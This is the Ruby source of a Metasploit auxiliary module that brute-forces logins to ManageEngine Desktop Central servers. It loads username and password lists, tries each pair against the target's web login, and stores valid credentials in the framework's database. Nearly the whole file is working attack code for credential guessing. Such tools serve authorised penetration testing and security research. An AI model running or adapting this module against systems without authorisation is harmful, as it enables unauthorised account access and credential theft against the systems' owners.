##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/manageengine_desktop_central'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'ManageEngine Desktop Central Login Utility',
      'Description'    => %q{
        This module will attempt to authenticate to a ManageEngine Desktop Central.
      },
      'Author'         => [ 'sinn3r' ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'RPORT' => 8020}
    ))
  end


  # Initializes CredentialCollection and ManageEngineDesktopCentral
  def init(ip)
    @cred_collection = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file:       datastore['PASS_FILE'],
      password:        datastore['PASSWORD'],
      user_file:       datastore['USER_FILE'],
      userpass_file:   datastore['USERPASS_FILE'],
      username:        datastore['USERNAME'],
      user_as_pass:    datastore['USER_AS_PASS']
    )

    @scanner = Metasploit::Framework::LoginScanner::ManageEngineDesktopCentral.new(
      configure_http_login_scanner(
        host: ip,
        port: datastore['RPORT'],
        cred_details:       @cred_collection,
        stop_on_success:    datastore['STOP_ON_SUCCESS'],
        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
        connection_timeout: 5,
        http_username:      datastore['HttpUsername'],
        http_password:      datastore['HttpPassword']
      )
    )
  end


  # Reports a good login credential
  def do_report(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      last_attempted_at: DateTime.now,
      status: result.status,
      proof: result.proof
    }.merge(service_data)

    create_credential_login(login_data)
  end


  # Attempts to login
  def bruteforce(ip)
    @scanner.scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute(:level => :good, :ip => ip, :msg => "Success: '#{result.credential}'")
        do_report(ip, rport, result)
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        vprint_brute(:level => :verror, :ip => ip, :msg => result.proof)
        invalidate_login(
          address: ip,
          port: rport,
          protocol: 'tcp',
          public: result.credential.public,
          private: result.credential.private,
          realm_key: result.credential.realm_key,
          realm_value: result.credential.realm,
          status: result.status,
          proof: result.proof
        )
      when Metasploit::Model::Login::Status::INCORRECT
        vprint_brute(:level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'")
        invalidate_login(
          address: ip,
          port: rport,
          protocol: 'tcp',
          public: result.credential.public,
          private: result.credential.private,
          realm_key: result.credential.realm_key,
          realm_value: result.credential.realm,
          status: result.status,
          proof: result.proof
        )
      end
    end
  end


  # Start here
  def run_host(ip)
    init(ip)
    unless @scanner.check_setup
      print_brute(:level => :error, :ip => ip, :msg => 'Target is not ManageEngine Desktop Central')
      return
    end

    bruteforce(ip)
  end
end
